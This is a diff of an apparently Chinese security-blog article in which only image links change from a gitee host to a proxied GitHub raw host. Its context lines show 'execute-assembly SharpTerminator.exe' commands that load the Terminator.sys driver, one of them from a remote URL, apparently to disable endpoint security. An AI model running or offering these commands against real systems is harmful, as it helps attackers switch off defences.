@@ -54,7 +54,7 @@ ___发表于_
     
     execute-assembly SharpTerminator.exe --url "http://remoteurl.com:80/Terminator.sys"
 
-### ![](https://gitee.com/fuli009/images/raw/master/public/20230622112345.png)
+### ![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230622112345.png)
 
   
 
@@ -66,7 +66,7 @@ ___发表于_
     
      execute-assembly SharpTerminator.exe --disk "C:\path\to\driver\Terminator.sys"
 
-![](https://gitee.com/fuli009/images/raw/master/public/20230622112346.png)
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230622112346.png)
 
   
 
@@ -100,7 +100,7 @@ CISP、PTE、PTS、DSG、IRE、IRS、NISP、PMP、CCSK、CISSP、ISO27001...
   
 ---  
   
-![](https://gitee.com/fuli009/images/raw/master/public/20230622112347.png)
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230622112347.png)
 
 往期推荐工具
 
